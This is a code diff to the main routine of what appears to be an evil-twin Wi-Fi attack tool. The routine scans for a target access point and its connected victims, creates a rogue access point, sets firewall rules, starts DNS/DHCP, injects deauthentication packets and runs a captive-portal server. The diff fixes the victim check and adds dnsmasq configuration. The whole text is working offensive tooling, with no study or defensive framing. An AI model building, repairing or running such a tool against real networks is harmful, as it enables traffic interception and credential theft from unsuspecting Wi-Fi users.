@@ -24,7 +24,7 @@ import subprocess
 import threading
 
 from sniffer_filter import set_monitor_mode, channel_hopper, scan_networks, scan_victims
-from twin_setup import create_evil_ap, set_firewall_rules, clear_firewall_rules, start_dns_dhcp, setup_network
+from twin_setup import create_evil_ap, set_firewall_rules, clear_firewall_rules, start_dns_dhcp, setup_network,create_dnsmasq_conf
 from injector import set_injector_adapter,send_disas_packets
 from captive_server import run_flask_server
 from interface_input import interface_select
@@ -68,13 +68,15 @@ def main():
 
         
         victim = scan_victims(EV_INTERFACE, target_ap, 30)
-        if victim:
+        if not victim:
             print("Exiting program")
+            sys.exit(1)
 
         hostapd_proc = create_evil_ap(EV_INTERFACE,target_ap) #WORKS 4 SURE
 
         clear_firewall_rules(EV_INTERFACE)
         set_firewall_rules(EV_INTERFACE)
+        create_dnsmasq_conf(EV_INTERFACE)
         dnsmasq_proc = start_dns_dhcp()
 
         set_injector_adapter(INJECT_INTERFACE, target_ap['channel'])
